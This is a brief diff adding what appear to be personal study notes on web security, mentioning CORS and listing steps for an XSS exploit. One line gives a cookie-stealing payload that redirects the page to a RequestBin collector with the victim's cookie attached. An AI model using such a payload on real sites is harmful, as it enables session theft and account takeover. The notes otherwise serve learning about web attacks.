@@ -1,0 +1,8 @@
+CORS - Protects cross origin
+XSS exploit
+  -First try html
+  -Then script and such
+  -<SCRIPT>document.location="Requestbin +cookie"</SCRIPT
+RequestBin!
+
+
